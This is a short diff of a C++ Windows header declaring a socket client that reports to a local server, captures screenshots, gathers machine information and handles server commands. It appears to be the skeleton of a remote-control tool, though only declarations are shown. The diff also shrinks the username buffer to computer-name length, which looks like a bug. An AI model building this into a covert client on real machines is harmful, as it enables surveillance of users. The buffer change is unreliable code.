@@ -1,3 +1,4 @@
+
 #pragma once
 #define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
@@ -15,7 +16,7 @@
 #pragma comment(lib, "netapi32.lib")
 
 #define SERVER_IP "127.0.0.1"
-#define SERVER_PORT 8080
+#define SERVER_PORT 5000
 #define HEARTBEAT_INTERVAL 60000 // 1 minute
 
 class SmartSocket {
@@ -41,12 +42,12 @@ public:
 private:
 	SOCKET handle = INVALID_SOCKET;
 };
-
 SmartSocket clientSocket;
+
 char computerName[MAX_COMPUTERNAME_LENGTH + 1];
-char userName[UNLEN];
+char userName[MAX_COMPUTERNAME_LENGTH + 1];
 char machineInfo[128];
-bool getMachineInformation();
+int getMachineInformation();
 void captureScreenshot();
 int connectToServer();
 void handleServerCommands();
